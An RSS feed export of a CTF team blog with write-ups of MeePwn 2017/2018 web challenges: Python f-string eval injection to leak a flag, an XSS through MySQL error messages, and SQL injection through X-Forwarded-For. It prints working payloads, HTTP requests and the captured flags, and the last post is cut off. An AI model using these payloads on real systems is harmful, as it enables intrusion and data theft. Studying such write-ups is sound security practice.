@@ -1,0 +1,461 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	
+xmlns:georss="http://www.georss.org/georss" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
+>
+
+<channel>
+	<title>web &#8211; BabyPhD CTF Team</title>
+	<atom:link href="https://babyphd.net/category/web/feed/" rel="self" type="application/rss+xml" />
+	<link>https://babyphd.net</link>
+	<description>Nói chung đây là một khái niệm vô cùng trừu tượng</description>
+	<lastBuildDate>Thu, 19 Jul 2018 07:06:46 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.2.2</generator>
+<site xmlns="com-wordpress:feed-additions:1">104079289</site>	<item>
+		<title>MEEPWN CTF 2018 - PyCalx2</title>
+		<link>https://babyphd.net/2018/07/17/meepwn-ctf-2018-pycalx2/</link>
+				<pubDate>Tue, 17 Jul 2018 13:39:52 +0000</pubDate>
+		<dc:creator><![CDATA[yeuchimse]]></dc:creator>
+				<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=734</guid>
+				<description><![CDATA[Bài này code giống hệt bài 1, khác mỗi cái là biến op bây giờ cũng không được chứa các ký tự trong mảng ['(',')','[',']','\'','"'] nữa, do đó không thể dùng kiểu +' để break giá trị của value2 ra ngoài chuỗi. Nói cách khác, value1 và value2 đều sẽ chỉ là các string đơn thuần. Mình search thử thì thấy &#8230; <a href="https://babyphd.net/2018/07/17/meepwn-ctf-2018-pycalx2/" class="more-link">Continue reading <span class="screen-reader-text">MEEPWN CTF 2018 - PyCalx2</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?ssl=1"><img data-attachment-id="735" data-permalink="https://babyphd.net/2018/07/17/meepwn-ctf-2018-pycalx2/2018-07-17_19-46-56/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?fit=818%2C331&amp;ssl=1" data-orig-size="818,331" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2018-07-17_19-46-56" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?fit=300%2C121&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?fit=604%2C244&amp;ssl=1" class="aligncenter wp-image-735 size-full" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?resize=604%2C244&#038;ssl=1" alt="" width="604" height="244" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?w=818&amp;ssl=1 818w, https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?resize=300%2C121&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?resize=768%2C311&amp;ssl=1 768w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Bài này code giống hệt bài 1, khác mỗi cái là biến <code>op</code> bây giờ cũng không được chứa các ký tự trong mảng <code>['(',')','[',']','\'','"']</code> nữa, do đó không thể dùng kiểu <code>+'</code> để break giá trị của <code>value2</code> ra ngoài chuỗi. Nói cách khác, <code>value1</code> và <code>value2</code> đều sẽ chỉ là các string đơn thuần.<span id="more-734"></span></p>
+<p>Mình search thử thì thấy Python3.6 có một tính năng mới là <a href="https://docs.python.org/3/whatsnew/3.6.html" target="_blank" rel="noopener">Formatted string literals</a>, hoạt động như sau:</p>
+<pre>Python 3.6.1 (v3.6.1:69c0db5, Mar 21 2017, 17:54:52) [MSC v.1900 32 bit (Intel)] on win32
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; a = 'xxx'
+&gt;&gt;&gt; f'{a}'
+'xxx'
+&gt;&gt;&gt; f'{0 if 2 &gt; 3 else 1}'
+'1'</pre>
+<p>Có thể thấy đây gần như là hướng duy nhất của bài này.</p>
+<p>Nếu <code>op = +f</code>, chuỗi được eval sẽ có dạng  <span style="color: #222222; font-family: monospace, serif;"><span style="font-size: 14px; background-color: #e9ebec;"><code>calc_eval = 'value1'+f'value2'</code></span></span>. Tương tự bài 1, chúng ta muốn dựa vào output của hàm eval để leak flag, mà output chỉ được in ra khi kết quả eval là số, là <code>'True'</code> hoặc <code>'False'</code>. Như thế dẫn đến một số suy luận sau:</p>
+<ol>
+<li>Vì <code>value1</code> kiểu gì cũng chỉ là chuỗi đơn thuần, nên sau khi eval nó sẽ vẫn là chính nó. Mặt khác, <code>value1</code> không thể là số vì nếu thế, <code>value2</code> cũng phải là số, chẳng có tác dụng gì. Vậy, <code>value1</code> là chữ.</li>
+<li>Nếu <code>value1</code> là chữ, thì kết quả sau khi eval không thể là số, nghĩa là chúng ta chỉ có thể thấy được output nếu eval ra <code>True</code> hoặc <code>False</code>, thì <code>value1</code> cần là một phần của <code>True</code> hoặc <code>False</code> (ví dụ <code>Tr</code> hoặc <code>Fals</code>, để sau khi kết hợp với <code>value2</code> sẽ ra giá trị hoàn chỉnh). Về lý thuyết chúng ta có thể để <code>value2</code> trả về đầy đủ chuỗi <code>True</code> hoặc <code>False</code>, tuy nhiên đề bài không cho phép <code>value1</code> là một chuỗi rỗng.</li>
+<li>Dạng biểu thức <code>f'{0 if 2 &gt; 3 else 1}'</code> có thể cho phép chúng ta leak flag giống bài 1, kiểu như <code>f'{'e' if 'MeePwn' in FLAG else 'x'}'</code>. Với biểu thức này, kết hợp với <code>value1 = Tru</code> thì khi nhận được output là <code>True</code>, chúng ta kết luận được FLAG có chứa chuỗi <code>MeePwn</code>, và ngược lại.</li>
+</ol>
+<p>Tất nhiên ở trên chỉ là ví dụ thôi, vì thực tế đề bài không cho dùng <code>'</code> trong <code>value2</code>. Sau một hồi ngồi nhìn màn hình, mình nghĩ ra một hướng khá là cần cù bù thông minh.</p>
+<pre>Content-Disposition: form-data; name="value1"
+
+Tru
+----------954427002
+Content-Disposition: form-data; name="op"
+
++f
+----------954427002
+Content-Disposition: form-data; name="value2"
+
+{source % 101 if source % 77 in FLAG else x}
+----------954427002
+Content-Disposition: form-data; name="source"
+
+%c</pre>
+<p>Output nhận được là <code>True</code> (hợp lý vì FLAG có chứa chữ <code>M</code> trong từ <code>MeePwn</code>).</p>
+<p>Nhưng check từng ký tự thì chỉ có thể tìm được charset của FLAG mà thôi, mình cần check được nhiều hơn. Do <code>value2</code> dài tối đa 64 ký tự, mình cố gắng xóa bớt mấy khoảng trắng, được như sau:</p>
+<pre>Content-Disposition: form-data; name="value1"
+
+Tru
+----------954427002
+Content-Disposition: form-data; name="op"
+
++f
+----------954427002
+Content-Disposition: form-data; name="value2"
+
+{source%101 if source%77+source%101+source%101 in FLAG else x}
+----------954427002
+Content-Disposition: form-data; name="source"
+
+%c</pre>
+<p>3 ký tự một lúc là khá ổn, đủ để mình tìm được đến <code>MeePwnCTF{python3.6[_strikes_backk</code>. Sau đó thì phát sinh một vấn đề, đó là với 2 ký tự <code>kk</code>, mình tìm được 2 chuỗi thỏa mãn là <code>kkk</code> và <code>kk}</code>. Cái sau chắc là phần kết của FLAG rồi, nhưng cái đầu thì khá là bế tắc, do không biết cần chính xác bao nhiêu chữ <code>k</code>. Mình có thể thử submit dần luôn trên scoreboard, nhưng ngại nhỡ bị ban thì mang tội với team, còn nếu clone một nick mới để thử thì lại làm tăng số đội giải được, điểm của mình cũng bị ảnh hưởng. Đều không vẹn toàn.</p>
+<p>Tự nhiên mình nghĩ đến một hướng, mặc dù đoán là không được nhưng vẫn quyết định thử:</p>
+<pre>&gt;&gt;&gt; '%c' % 49 * 3
+'111'</pre>
+<p>Kỳ diệu. Mình cứ sợ là nó sẽ thành <code>'%c' % 147</code>.</p>
+<p>FLAG: <code>MeePwnCTF{python3.6[_strikes_backkkkkkkkkkkk)}</code></p>
+<p>P.S: Bài này Jinmo làm theo một cách thực sự rất đẹp và đáng được ngợi ca, mọi người có thể đọc tại <a href="https://github.com/Jinmo/ctfs/blob/master/2018/meepwn/pycalx_both.py" target="_blank" rel="noopener">đây</a>. Kudos to him!</p>
+<p>&nbsp;</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">734</post-id>	</item>
+		<item>
+		<title>MeepwnCTF 2017 - injection</title>
+		<link>https://babyphd.net/2017/07/27/meepwnctf-2017-injection/</link>
+				<pubDate>Thu, 27 Jul 2017 18:47:24 +0000</pubDate>
+		<dc:creator><![CDATA[justcallmedude]]></dc:creator>
+				<category><![CDATA[web]]></category>
+		<category><![CDATA[xss]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=659</guid>
+				<description><![CDATA[Another injection? Awesome, another ART I want to learn so much. Learning *injection*-fu is hard, keep learning, practicing, ctf all the time. According to Saitama, after a year and half of 100 daily push-ups, sit-ups, and squats, plus 10 km daily running, he had achieved some level of superhuman strength. Sourcecode (base64) Spoiler alert: In the previous &#8230; <a href="https://babyphd.net/2017/07/27/meepwnctf-2017-injection/" class="more-link">Continue reading <span class="screen-reader-text">MeepwnCTF 2017 - injection</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>Another injection? Awesome, another ART I want to learn so much. Learning *injection*-fu is hard, keep learning, practicing, <a href="https://ctftime.org/">ctf all the time</a>.</p>
+<blockquote><p>According to <a href="http://onepunchman.wikia.com/wiki/Saitama">Saitama</a>, after a year and half of 100 daily push-ups, sit-ups, and squats, plus 10 km daily running, he had achieved some level of superhuman strength.</p></blockquote>
+<p><a href="https://pastebin.com/hnvvVhW9">Sourcecode</a> (base64)</p>
+<p><span id="more-659"></span></p>
+<p>Spoiler alert: <span style="color: #ffffff;">In the previous post, I once said something about SQLi (aka SQL injection) and XSS.</span><br />
+I will write up as my timeline trying to solve this task.<br />
+I have sourcecode, yay, at least I known what the heck i'm facing with. At this time, I could use <a href="http://rips-scanner.sourceforge.net/">RIPS</a> but I already have experience in source code audit, so, kill the bear with bare hand, why not (<strong>I'm not support killing wild animals</strong>).<br />
+Exploring source code is just time-comsuming task, after that, I have some notes:</p>
+<ul>
+<li>Database structure:
+<ul>
+<li>The flag is the <code>links</code> table</li>
+<li>charset LATIN1</li>
+<li>all string field is varchar(500) - that's mean only 500 char stored in that column. I have some ideas about SQL truncate attack</li>
+</ul>
+</li>
+<li>The BOT:
+<ul>
+<li>chim.js is a file used in phantomjs (a headless browser), very familar with XSS problem.</li>
+<li>the <code>secret</code> cookie is HTTPOnly (i'm not very it yet, blind trust), can't easy inject javascript code to steal cookie.</li>
+</ul>
+</li>
+<li>The php code:
+<ul>
+<li>every input entry has been <code>mysqli_real_escape_string</code></li>
+<li>every output has been <code>htmlentities</code> - the problem is this function by design/default didn't escape single quote '</li>
+<li>CSRF, not have any CSRF check, likely XSS.</li>
+<li>
+<div>
+<div>SET sql_mode=ANSI ?</div>
+</div>
+</li>
+<li>
+<div>
+<div>function `filterLink` remove single quote ', double quote ", backtick `</div>
+</div>
+</li>
+<li>
+<div>
+<div>`mysqli_error` for debug only?</div>
+</div>
+<div></div>
+</li>
+</ul>
+</li>
+</ul>
+<p>The very likely exploitable for a XSS vuln is <a href="http://php.net/manual/en/function.htmlentities.php">htmlentities</a><br />
+<span class="type">string</span> <span class="methodname"><strong>htmlentities</strong></span> ( <span class="methodparam"><span class="type">string</span> <code class="parameter">$string</code></span> [, <span class="methodparam"><span class="type">int</span> <code class="parameter">$flags</code><span class="initializer"> = ENT_COMPAT | ENT_HTML401</span></span> [, <span class="methodparam"><span class="type">string</span><code class="parameter">$encoding</code><span class="initializer"> = ini_get("default_charset")</span></span> [, <span class="methodparam"><span class="type">bool</span> <code class="parameter">$double_encode</code><span class="initializer"> = true</span></span> ]]] )</p>
+<p>Default flag is ENT_COMPAT | ENT_HTML401, but if I want to convert ', look at the flag table</p>
+<table class="doctable table">
+<thead>
+<tr>
+<th>Constant Name</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody class="tbody">
+<tr>
+<td><strong><code>ENT_COMPAT</code></strong></td>
+<td>Will convert double-quotes and leave single-quotes alone.</td>
+</tr>
+<tr>
+<td><strong><code>ENT_QUOTES</code></strong></td>
+<td>Will convert both double and single quotes.</td>
+</tr>
+<tr>
+<td><strong><code>ENT_NOQUOTES</code></strong></td>
+<td>Will leave both double and single quotes unconverted.</td>
+</tr>
+<tr>
+<td><span style="font-family: monospace, serif;"><b>...</b></span></td>
+<td>...</td>
+</tr>
+<tr>
+<td><strong><code>ENT_HTML401</code></strong></td>
+<td>Handle code as HTML 4.01.</td>
+</tr>
+</tbody>
+</table>
+<p>Not bad, expected by design <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f600.png" alt="😀" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p>In a CTF challenge, most of task are solvable or exploitable. From my point of view, everything echo-ed back to us is something useful. such as `mysqli_error`.<br />
+In some point, I had tried to exploit the register function to make a new Admin but UNIQUE KEY (`user`) in table structure prevented it.</p>
+<p>Luckily, when I try to insert a duplicated user into table, it warn me, with the most beautiful char, a single quote.<br />
+Example Database, notice the  space at user column.</p>
+<pre><code>CREATE DATABASE inj_1;
+USE inj_1;
+CREATE TABLE `users` (
+`uid` int(11) NOT NULL AUTO_INCREMENT,
+`user` varchar(50) NOT NULL,
+`passwd` varchar(50) NOT NULL,
+PRIMARY KEY (`uid`),
+UNIQUE KEY (`user`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+ALTER TABLE `users` AUTO_INCREMENT=1;
+INSERT INTO `users` VALUES (0, 'admin', 'a');
+INSERT INTO `users` VALUES (0, 'admin ', 'a');
+INSERT INTO `users` VALUES (0, 'admin onerror=aaa', 'a');
+INSERT INTO `users` VALUES (0, 'admin onerror=aaa ', 'a');</code></pre>
+<p><a href="https://i1.wp.com/imgur.com/pXZmlmX.png"><img class="alignnone size-full" src="https://i1.wp.com/imgur.com/pXZmlmX.png?w=604" alt="" data-recalc-dims="1" /></a></p>
+<p>One more thing with SELECT is, it didn't do bound check on input, look at this example</p>
+<pre>mysql&gt; select * from users;
++-----+-------------------+--------+
+| uid | user | passwd |
++-----+-------------------+--------+
+| 1 | admin | a |
+| 3 | admin onerror=aaa | a |
++-----+-------------------+--------+
+2 rows in set (0,00 sec)
+
+mysql&gt; select * from users where user = 'admin'
+-&gt; ;
++-----+-------+--------+
+| uid | user | passwd |
++-----+-------+--------+
+| 1 | admin | a |
++-----+-------+--------+
+1 row in set (0,01 sec)
+
+mysql&gt; select * from users where user = 'admin      ';
++-----+-------+--------+
+| uid | user | passwd |
++-----+-------+--------+
+| 1 | admin | a |
++-----+-------+--------+
+1 row in set (0,00 sec)
+
+mysql&gt; select * from users where user = 'admin                    ';
++-----+-------+--------+
+| uid | user | passwd |
++-----+-------+--------+
+| 1 | admin | a |
++-----+-------+--------+
+1 row in set (0,00 sec)
+
+mysql&gt; select * from users where user = 'admin                                                 1';
+Empty set (0,00 sec)
+
+</pre>
+<p>With <code>SET sql_mode=ANSI</code> , I can bypass SELECT, also able trigger error in INSERT.<br />
+If you test in your db; make sure you have change your sql_mode,</p>
+<p>by default (mysqld --verbose --help | grep mode) give ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</p>
+<p>STRICT_TRANS_TABLES will give  error <code>1406 (22001): Data too long for column</code></p>
+<p>In the code, there is a lot of space content <code>$msg = mysqli_error($con);</code> but I look the register function first. Then a lot of time trying to finger out how can I bypass the disable tag to have a functional onfocus tag (line 61 file login.php)</p>
+<p><code>echo "&lt;input type='text' value='$msg' class='form-control' disabled&gt;";</code></p>
+<p>After mysql return error string, I may have the following text:</p>
+<div>
+<div>&lt;input type='text' value='Duplicate entry 'admin onerror=aaa   ' for key 'user'' class='form-control' disabled&gt;</div>
+<div>
+<p>Now <code>onerror</code> has been escaped from the single quote, it is a event and can be develop with real payload such as onfocus, but it is disabled in this input form.</p>
+</div>
+<div>Example: &lt;input autofocus onfocus=alert(1)&gt; will pop an alert box</div>
+<div>But not this one &lt;input autofocus onfocus=alert(1) disabled&gt;</div>
+</div>
+<div></div>
+<div>Another place that I haven't notice is the links table. It also have uniq key is link, type of varchar(500)</div>
+<div>
+<p>Line 29 of index.php, the manual check did the same thing with register, both have</p>
+<div>
+<div><code>$msg = mysqli_error($con);</code></div>
+<div>but this time, it is</div>
+<div>
+<div>
+<div>echo "&lt;input type='text' value='$msg' class='form-control' readonly&gt;";</div>
+</div>
+<div>Yeah, readonly is better than <a href="https://www.w3.org/TR/html4/interact/forms.html#h-17.12">disabled</a>, I can use my favarite autofocus</div>
+<div></div>
+</div>
+</div>
+</div>
+<div> The final exploit flow could be (assume this is a XSS challenge):</div>
+<div></div>
+<ol>
+<li>register</li>
+<li>login</li>
+<li>send a link that trigger a CSRF exploit to make bot create manual exploit link</li>
+<li>resubmit that trigger link</li>
+<li>waiting for flag, <a href="https://www.youtube.com/watch?v=pRpeEdMmmQ0">waka waka</a></li>
+</ol>
+<p>Now this is time for trial error, <a href="https://pastebin.com/mFCzmSN5">here</a><br />
+or the original <a href="https://pastebin.com/jnCKtVi0">here</a><br />
+Ref:</p>
+<ul>
+<li>https://ctftime.org/</li>
+<li>http://onepunchman.wikia.com/wiki/Saitama</li>
+<li>https://pastebin.com/hnvvVhW9</li>
+<li>http://rips-scanner.sourceforge.net/</li>
+<li>http://php.net/manual/en/function.htmlentities.php</li>
+<li>https://www.w3.org/TR/html4/interact/forms.html#h-17.12</li>
+<li>https://www.youtube.com/watch?v=pRpeEdMmmQ0</li>
+<li>https://pastebin.com/mFCzmSN5</li>
+<li>https://pastebin.com/jnCKtVi0</li>
+</ul>
+<p>PS: WordPress SUCK!!!</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">659</post-id>	</item>
+		<item>
+		<title>MeepwnCTF 2017 - Br0kenMySQL	1-2-3</title>
+		<link>https://babyphd.net/2017/07/27/meepwnctf-2017-br0kenmysql1-2-3/</link>
+				<pubDate>Thu, 27 Jul 2017 15:00:47 +0000</pubDate>
+		<dc:creator><![CDATA[justcallmedude]]></dc:creator>
+				<category><![CDATA[web]]></category>
+		<category><![CDATA[sqli]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=655</guid>
+				<description><![CDATA[SQL injection, it's not only about %27, everything is Art. The author is the artist, and the competitor is critic. But not me, I'm just a dude want to make some fun, solving those inovative challenge help me remove my limit barriers. There are 3 tasks. sourcecode sourcecode sourcecode These were written in PHP and MySQL, &#8230; <a href="https://babyphd.net/2017/07/27/meepwnctf-2017-br0kenmysql1-2-3/" class="more-link">Continue reading <span class="screen-reader-text">MeepwnCTF 2017 - Br0kenMySQL	1-2-3</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>SQL injection, it's not only about %27, everything is Art. The author is the artist, and the competitor is critic. But not me, I'm just a dude want to make some fun, solving those inovative challenge help me remove my limit barriers.</p>
+<p>There are 3 tasks.</p>
+<ol>
+<li><a href="https://pastebin.com/T7zAcdhb">sourcecode</a></li>
+<li><a href="https://pastebin.com/kLAyi6qS">sourcecode</a></li>
+<li><a href="https://pastebin.com/v0PAEFNY">sourcecode</a></li>
+</ol>
+<p><span id="more-655"></span></p>
+<p>These were written in PHP and MySQL, you will need knownledge and experience about it.</p>
+<p>1.</p>
+<p>A very very classic web vulnerability called <a href="https://www.owasp.org/index.php/SQL_Injection">SQL injection</a> (a kind of *injection*-ish) when you can inject your own query into developer's SQL query, make use of old query to extract information from database, make that query crash or keep it running depend on your purpose (leak full text or single bit, even out of band over other channel such as DNS, combine with XSS,..)</p>
+<p>On line 25 when <code>$id</code> combined with SELECT statement to get <code>username</code> out of <code>users</code> table with some filter, then that <code>username</code> <a href="http://php.net/manual/en/types.comparisons.php">strict compare</a> (===) with string <code>guest</code></p>
+<p>On line 36, again, <code>$ip</code> from <code>$_SERVER['HTTP_X_FORWARDED_FOR']</code> process through same filter will be insert into <code>logs</code> table, in PHP, `<a href="http://php.net/manual/en/reserved.variables.server.php">$_SERVER</a>['HTTP_X_FORWARDED_FOR']` equal to <a href="https://en.wikipedia.org/wiki/X-Forwarded-For"><code>X-Forwared-for</code></a> in HTTP request sent to the  PHP script.</p>
+<p>On line 38, same <code>$ip</code>  (after filtered) will be SELECT from same <code>users</code> table. But this time this should return <code>admin if we want flag at line 43.<br />
+</code></p>
+<p>This is confusing when with 2 same query but have 2 difference results. The first thing popped up like an alert box in my mind is using some kind of condition query. More detail, 1st: query return guest if condition A else admin, then change A; 2nd: because A changed so query return admin.</p>
+<p>The INSERT query could be abuse for that. In MySQL there is a thing called <a href="https://dev.mysql.com/doc/refman/5.7/en/user-variables.html">variable</a>.<br />
+They are permanently in same and single connection to database.<br />
+My ideas come clear with SQL query look like:</p>
+<p>select username from users where id = -1 union select ( 'guest' if @a=1337 else 'admin')<br />
+insert into logs values(''),(@a:=1337),('')<br />
+select username from users where id = -1 union select ( 'guest' if @a=1337 else 'admin')</p>
+<p>But I came first with a solution did not require `union` and `select`.<br />
+Enum the <code>id</code> parameter (?id=1,?id=2, ?id=3...) , it turned out 1 is <code>admin</code> and 2 is <code>guest</code>, add a little math-MySQL-magic, trial-error, help from MySQL documents, I have got final payload:</p>
+<p><code><br />
+GET /?id=2-if(@a=1337,@a:=1,@a:=0) HTTP/1.1<br />
+Host: 139.59.239.133<br />
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+Accept-Language: en-US,en;q=0.5<br />
+Accept-Encoding: gzip, deflate<br />
+Connection: close<br />
+X-Forwarded-For: 1'),(@a:=1337),('2<br />
+Upgrade-Insecure-Requests: 1<br />
+</code></p>
+<p>With response<br />
+<code>Br0kenMySQL<br />
+&lt;p style="color: red;"&gt;Br0kenMySQL&lt;/p&gt;<br />
+string(18) "1'),(@a:=1337),('2"<br />
+What ???????<br />
+Login as guest&amp;amp;admin at the same time ?<br />
+Seems our code is broken, here is your bounty<br />
+MeePwnCTF{_b4by_tr1ck_fixed}<br />
+</code><br />
+2.<br />
+This is an upgrade version of the first task.<br />
+It added more filter <code>select|from|<span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_b99834bc19bbad24580b3adfa04fb947.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></code>, now I need <code>$id</code> without select, from, and (, ), luckily, now I only need remove ( and ),<br />
+In MySQL there are a lot of conditional statement. because <code>IF</code> need his parent-heses, in <code>CASE</code> of fire, break glass, <code>THEN</code> call <code>114</code>. Oh, did you who am I talking about?</p>
+<p>Yeah, it is <a href="https://dev.mysql.com/doc/refman/5.7/en/case.html">CASE ... THEN ... ELSE ... END</a><br />
+Debugging <code>INSERT</code> in mysqlclient connected to my test database let me know that I can assign variable's value inside statement, it is just a subquery if I correct.</p>
+<p><code>GET /v2/?id=2-case+when+%40a%3d1337+then+1+else+0+end HTTP/1.1<br />
+Host: 139.59.239.133<br />
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+Accept-Language: en-US,en;q=0.5<br />
+Accept-Encoding: gzip, deflate<br />
+Connection: close<br />
+X-Forwarded-For: '+@a:=1337+'<br />
+Upgrade-Insecure-Requests: 1</code></p>
+<p><code>Br0kenMySQL<br />
+&lt;p style="color: red;"&gt;Br0kenMySQL&lt;/p&gt;<br />
+string(12) "'+@a:=1337+'"<br />
+What, again ???????!@#$!@#$!@#$<br />
+MeePwnCTF{_I_g1ve__uPPPPPPPP}<br />
+http://139.59.239.133/c541c6ed5e28b8762c4383a8238e6f5632cc7df6da8ce9db7a1aa706d1e5c387/?debug=%F0%9F%95%B5<br />
+</code><br />
+3.<br />
+Althrough <code>time|date|sec|day</code> was blacklisted but I didn't use any of them.<br />
+Yay, same payload for 3rd flag.</p>
+<p>Thanks @ml for great challenges. You absolutely should try <a href="https://github.com/l4wio/CTF-challenges-by-me/tree/master/meepwn-2017">his CTF challenge</a> repo at Github.</p>
+<p>Ref:</p>
+<ul>
+<li>https://pastebin.com/T7zAcdhb</li>
+<li>https://pastebin.com/kLAyi6qS</li>
+<li>https://pastebin.com/v0PAEFNY</li>
+<li>https://www.owasp.org/index.php/SQL_Injection</li>
+<li>http://php.net/manual/en/types.comparisons.php</li>
+<li>http://php.net/manual/en/reserved.variables.server.php</li>
+<li>https://en.wikipedia.org/wiki/X-Forwarded-For</li>
+<li>https://dev.mysql.com/doc/refman/5.7/en/user-variables.html</li>
+<li>https://dev.mysql.com/doc/refman/5.7/en/case.html</li>
+<li>https://github.com/l4wio/CTF-challenges-by-me/tree/master/meepwn-2017</li>
+</ul>
+<p>&nbsp;</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">655</post-id>	</item>
+		<item>
+		<title>ASISCTF 2017 - Web - Secure portal [1,2,3]</title>
+		<link>https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/</link>
+				<pubDate>Fri, 12 May 2017 13:38:37 +0000</pubDate>
+		<dc:creator><![CDATA[justcallmedude]]></dc:creator>
+				<category><![CDATA[web]]></category>
+		<category><![CDATA[unserialize]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=642</guid>
+				<description><![CDATA[Hey yo! Long time no C++ Có chút vấn đề khi mình viết writeup cho bài này đó là phần lầy flag có vẻ không hoạt động 🙁 nên hiện tại mình chỉ có thể viết được phần 1. Okie, link Có gợi ý như sau By the way I know it's dangerous to code with &#8230; <a href="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/" class="more-link">Continue reading <span class="screen-reader-text">ASISCTF 2017 - Web - Secure portal [1,2,3]</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>Hey yo!</p>
+<p>Long time no C++<br />
+Có chút vấn đề khi mình viết writeup cho bài này đó là phần lầy flag có vẻ không hoạt động <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f641.png" alt="🙁" class="wp-smiley" style="height: 1em; max-height: 1em;" /> nên hiện tại mình chỉ có thể viết được phần 1.</p>
+<p>Okie, <a href="http://66.172.33.77:8080/">link</a></p>
+<p>Có gợi ý như sau <em><strong>By the way I know it's dangerous to code with IDE in server-side but I really obey security instructions</strong>.</em></p>
+<p>Vào trang web và lưu lại các request &amp; response bằng Burpsuite Proxy</p>
+<p style="text-align: center;"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?ssl=1"><img data-attachment-id="643" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/1-2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?fit=1221%2C750&amp;ssl=1" data-orig-size="1221,750" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?fit=300%2C184&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?fit=604%2C371&amp;ssl=1" class="aligncenter wp-image-643 size-full" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?resize=604%2C371&#038;ssl=1" width="604" height="371" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?w=1221&amp;ssl=1 1221w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?resize=300%2C184&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?resize=768%2C472&amp;ssl=1 768w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?resize=1024%2C629&amp;ssl=1 1024w" sizes="(max-width: 604px) 100vw, 604px" 